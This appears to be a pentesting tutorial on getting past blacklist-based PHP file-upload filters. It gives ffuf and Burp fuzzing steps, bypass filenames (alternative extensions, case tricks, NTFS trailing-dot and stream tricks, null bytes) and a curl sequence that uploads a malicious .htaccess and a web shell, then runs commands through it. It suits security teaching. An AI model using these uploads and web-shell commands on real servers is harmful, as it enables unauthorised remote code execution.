# Blacklist Filter Bypass

A blacklist approach to file upload validation blocks specific known-dangerous extensions while allowing everything else. This is fundamentally backwards security logic: it assumes developers can predict every dangerous extension, which is impossible given how many PHP-executable extensions exist and how server configurations vary.

***

## Why Blacklists Fail

The typical vulnerable blacklist implementation looks like this:

```php
$extension = pathinfo($_FILES["uploadFile"]["name"], PATHINFO_EXTENSION);
$blacklist = array('php', 'php7', 'phps');

if (in_array($extension, $blacklist)) {
    echo "Extension not allowed";
    die();
}
```

Three immediate problems:

1. The comparison is case-sensitive, so `shell.PHP` or `shell.pHp` passes straight through on Linux servers
2. The list only covers a handful of the 20+ extensions PHP can execute
3. It checks the extension but not the actual file content or how the server is configured to handle that extension

***

## Full PHP Executable Extension List

PHP execution is not exclusive to `.php`. The following extensions execute PHP code depending on the server configuration and PHP version:

```
.php .php2 .php3 .php4 .php5 .php6 .php7
.phtml .phps .pht .phtm .pgif .shtml
.phar .inc .hphp .ctp .module
```

Extensions confirmed working on PHP 8 with Apache: `.php`, `.php4`, `.php5`, `.phtml`, `.module`, `.inc`, `.hphp`, `.ctp`

A blacklist that only blocks `.php` and `.php7` leaves `.phtml`, `.phar`, `.php5`, `.pht`, and several others all fully executable. 

***

## Fuzzing for Allowed Extensions with Burp Intruder

Before manually guessing, fuzz the upload endpoint against the full extension list from [PayloadsAllTheThings PHP extensions list](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Upload%20Insecure%20Files/Extension%20PHP/extensions.lst):

**Step 1:** Capture a valid upload request in Burp, send it to Intruder.

**Step 2:** In the Positions tab, clear all positions and mark only the extension in the filename:

```
filename="shell.§php§"
```

**Step 3:** Load the PHP extensions wordlist in Payloads, uncheck URL encoding (to preserve the dot).

**Step 4:** Start the attack and sort results by response length. Responses with a different length from the "Extension not allowed" error are candidates for upload success.

The same approach works with `ffuf`:

```bash
ffuf -w php_extensions.txt:FUZZ \
     -u http://TARGET/upload.php \
     -X POST \
     -F "uploadFile=@shell.FUZZ;type=image/png" \
     -fr "Extension not allowed"
```

***

## Bypass Techniques

### 1. Alternative PHP Extensions

The most straightforward bypass: try extensions not on the blacklist that PHP still executes:

```
shell.phtml   # Most commonly missed by developers
shell.php5    # PHP 5 specific
shell.phar    # PHP archive, executes on most configs
shell.pht     # Less common but valid
shell.inc     # Include files, often execute as PHP
```

### 2. Case Manipulation

On Linux, extension matching is case-sensitive but PHP execution is not. If the blacklist only checks lowercase:

```
shell.PHP     # Uppercase bypasses case-sensitive in_array()
shell.pHp     # Mixed case
shell.PhP     # Alternative mixed case
shell.PHP5    # Combined with alternative extension
```

Windows servers are case-insensitive at the filesystem level, so this works there too for different reasons.

### 3. Double Extension

Apache can be configured to process files based on any recognised extension in the filename, not just the last one. If `shell.php.jpg` is processed, Apache may interpret it as PHP because `.php` appears somewhere in the name:

```
shell.php.jpg
shell.php.png
shell.jpg.php   # PHP at end, may bypass blacklist checking last ext only
```

This depends on the Apache `mod_mime` configuration having `AddHandler` or `AddType` set for PHP.

### 4. .htaccess Upload (Apache)

One of the most powerful techniques when `.htaccess` uploads are not restricted. By uploading a malicious `.htaccess` file first, you instruct Apache to execute a custom extension as PHP:

```apache
AddType application/x-httpd-php .l33t
```

After uploading this `.htaccess` to the uploads directory, upload `shell.l33t` containing PHP code. Apache now executes `.l33t` files as PHP in that directory.  This completely sidesteps the extension blacklist since neither `.htaccess` nor `.l33t` are on any standard PHP blacklist. 

The full attack sequence:

```bash
# Step 1: Upload the .htaccess override
curl -X POST http://TARGET/upload.php \
     -F "uploadFile=@.htaccess;type=text/plain;filename=.htaccess" 

# .htaccess content:
# AddType application/x-httpd-php .evil

# Step 2: Upload the shell with custom extension
curl -X POST http://TARGET/upload.php \
     -F "uploadFile=@shell.evil;type=image/png"

# Step 3: Execute
curl "http://TARGET/uploads/shell.evil?cmd=id"
```

### 5. Windows-Specific Bypasses

On Windows servers, NTFS handles filenames differently and several edge cases survive the filesystem translation:

```
shell.php::$DATA    # NTFS alternate data stream, strips stream identifier
shell.php.          # Trailing dot removed by Windows, becomes shell.php
shell.php<space>    # Trailing space stripped, becomes shell.php
```

These work because Windows strips the trailing characters when writing the file, so the server saves `shell.php` despite the filter seeing `shell.php.` or `shell.php<space>` as different strings.

### 6. Null Byte Injection (PHP < 5.3.4)

On older PHP versions, a null byte terminates string processing:

```
shell.php%00.jpg   # Filter sees .jpg, PHP opens shell.php
shell.php\x00.jpg  # Hex null byte equivalent
```

This is patched in PHP 5.3.4 and above but remains relevant against legacy systems.

***

## Extension Bypass Priority Matrix

```
1. Try .phtml first               → Most commonly missed, widely executable
2. Try .php5, .php4, .php3       → Version-specific, often forgotten
3. Try .phar, .pht, .inc         → Less common but valid
4. Try case variations (.PHP)     → If Linux + case-sensitive comparison
5. Try double extension           → Depends on Apache mod_mime config
6. Upload .htaccess first         → Most powerful if not restricted
7. Try Windows tricks if IIS      → Trailing dot, space, NTFS streams
```

The reason blacklists fail as a strategy is not that developers make small mistakes, it is that the attack surface is too large to enumerate completely. A whitelist that only permits `.jpg`, `.png`, and `.gif` with server-side content validation is the only reliable approach, since it reduces the permitted set to explicitly known-safe types rather than trying to block an ever-growing list of dangerous ones.
